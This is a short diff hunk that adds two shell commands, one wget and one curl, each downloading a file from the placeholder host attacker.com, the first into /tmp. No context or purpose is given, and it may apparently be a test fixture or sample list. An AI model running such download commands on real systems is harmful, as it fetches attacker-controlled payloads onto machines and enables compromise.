@@ -1,0 +1,3 @@
+wget http://attacker.com/file -O /tmp/file
+
+curl -O http://attacker.com/file
